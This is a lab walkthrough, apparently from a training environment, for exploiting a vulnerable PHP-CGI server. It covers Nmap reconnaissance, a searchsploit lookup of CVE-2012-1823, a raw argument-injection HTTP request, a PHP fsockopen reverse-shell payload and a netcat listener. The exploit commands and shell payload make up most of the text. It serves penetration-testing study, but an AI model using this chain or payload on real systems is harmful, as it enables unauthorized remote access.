# Targeting PHP

Nmap to identify which port php running
```bash
└─# nmap -sV -O 10.0.26.121        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 14:10 IST
Nmap scan report for demo.ine.local (10.0.26.121)
Host is up (0.0029s latency).
Not shown: 982 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

On browser check file frequently have php vesion information\
http://targetIP/phpinfo.php \
-> Version 5.2.4-2ubuntu5.10 \
Version lower than 5.3.1 vulnerable to command injection attack

```bash
└─# searchsploit php cgi
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-b | php/remote/29290.c
Axis Network Camera 2.x And Video Serve | cgi/webapps/24402.php
Barracuda Networks Cloud Series - Filte | cgi/webapps/35900.txt
Barracuda Networks Message Archiver 650 | cgi/webapps/34103.txt
Citrix CloudBridge - 'CAKEPHP' Cookie C | cgi/webapps/42346.txt
cPanel WebHost Manager 3.1 - 'addon_con | php/webapps/29183.txt
Freeside SelfService CGI/API 2.3.3 - Mu | php/webapps/19598.txt
Iris ID IrisAccess ICU 7000-2 - Multipl | cgi/webapps/40165.txt
Iris ID IrisAccess ICU 7000-2 - Remote  | cgi/webapps/40166.txt
K-COLLECT CSV_DB.CGI 1.0/i_DB.CGI 1.0 - | php/webapps/25904.c
MRCGIGUY Amazon Directory 1.0/2.0 - Ins | php/webapps/8685.txt
MRCGIGUY ClickBank Directory 1.0.1 - In | php/webapps/8682.txt
mrcgiguy freeticket - Cookie Handling / | php/webapps/8926.txt
MRCGIGUY Hot Links - 'report.php?id' SQ | php/webapps/8918.txt
MRCGIGUY Hot Links SQL 3.2.0 - Insecure | php/webapps/8684.txt
~~~~~~~~~~~~~~~~~
PHP < 5.3.12 / < 5.4.2 - CGI Argument I | php/remote/18836.py
~~~~~~~~~~~~~~~~

└─# searchsploit -m 18836 
  Exploit: PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection
      URL: https://www.exploit-db.com/exploits/18836
     Path: /usr/share/exploitdb/exploits/php/remote/18836.py
    Codes: CVE-2012-2336, CVE-2012-2311, CVE-2012-1823, OSVDB-81633
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/18836.py

└─# python2 18836.py 
[+]Usage: cgi_test.py site.com 80

└─# python2 18836.py 10.0.26.121 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.0.26.121
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

<?php phpinfo();?>

'HTTP/1.1 200 OK\r\nDate: Mon, 28 Jul 2025 08:54:21 GMT\r\nServer: Apache/2.2.8 (Ubuntu) DAV/2\r\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html\r\n\r\n1004\r\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">\n<html><head>\n<style type="text/css">\nbody {background-color: #ffffff; color: #000000;}\nbody, td, th, h1, h2 {font-family: sans-serif;}\npre {margin: 0px; font-family: monospace;}\na:link {color: #000099; text-decoration: none; background-color: #ffffff;}\na:hover {text-decoration: underl
~~~~~~~~
```

Make change to the file \
`$sock=fsockopen("targetIP",1234);exec("/bin/sh -i <&3 >&3 2>&3")`
```bash
pwn_code = """<?php $sock=fsockopen("targetIP",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>"""
```

```bash
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

Run the command again -> should recieve reverse shell on listening port
```bash
└─# python2 18836.py 10.0.26.121 80
```

